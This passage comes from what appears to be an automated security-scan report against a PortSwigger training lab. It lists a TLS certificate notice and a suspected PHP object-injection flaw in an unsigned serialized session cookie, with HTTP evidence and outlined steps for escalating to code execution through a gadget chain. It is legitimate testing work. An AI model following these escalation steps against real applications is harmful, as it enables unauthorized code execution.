                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                    <!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-6"></a>

### 6. [INFO] [burp] TLS certificate

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The server presented a valid, trusted TLS certificate. This issue is purely informational.<br><br>The server presented the following certificates:<br><br><h4>Server certificate</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Amazon RSA 2048 M01</td></tr><tr><td><b>Valid from:</b>&nbsp;&nb @ https://0a14001003ba06e480069a13001b0048.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr661nym-2z` — `artifacts/_/ev-mr661nym-2z/`

Request:

```http
GET / HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
```

Response:

```http
HTTP/1.1 0
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-7"></a>

### 7. [SUSPECTED] [CRITICAL] [rce] PHP object injection via session cookie — likely escalates to remote code execution

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/

**Anomaly (why this is a lead):** Session cookie is a client-controlled base64 PHP-serialized User object fed directly to unserialize() (no signature). Crafted serialized payloads reach the deserializer and trigger 500-level unserialize errors, confirming a PHP object-injection sink; a gadget chain would very likely yield RCE, but none was built in this bounded diagnosis.

The `session` cookie issued by POST /login is an attacker-controlled base64 PHP-serialized object that the server passes to `unserialize()` without integrity checks (confirmed sink — see f-001). PHP object injection of this kind is RCE-class: with a suitable POP/gadget chain reachable in the application's autoloaded classes (or a PHAR deserialization vector), an attacker can instantiate arbitrary objects and drive magic methods (__wakeup/__destruct/__toString) to file read/write, SSRF, or command execution. I confirmed the deserialization sink (malformed and crafted serialized payloads both reach `unserialize()` and error with HTTP 500) but did not build/deliver a working gadget chain within this bounded login-screen diagnosis — hence recorded as a suspected lead for manual verification (identify available gadget classes, e.g. via source disclosure / a leaked class, then craft the chain).

**Reproduction**

```
1. Obtain the serialized session cookie (POST /login wiener:peter → base64 `O:4:"User":2:{...}`).
2. Confirm the sink: supply a crafted serialized object as the cookie → server 500s on `unserialize()` (ev-mr62x7ou-f). 
3. Escalation (not completed here): enumerate autoloadable classes with exploitable magic methods, craft a POP chain (or PHAR), inject it via the `session` cookie, and confirm code execution / file access out-of-band.
```

**Evidence**

- Evidence `ev-mr62x7ou-f` — `artifacts/s-0002/ev-mr62x7ou-f/`

Request:

```http
GET /my-account HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 500
content-length: 3407
content-type: text/html; charset=utf-8
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                    </header>
                    <h4>Internal Server Error</h4>
                    <p class=is-warning>PHP Fatal error:  Uncaught Exception: Invalid user administrator in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7</p>
                </div>
            </section>
        </div>
    </body>
</html>
```
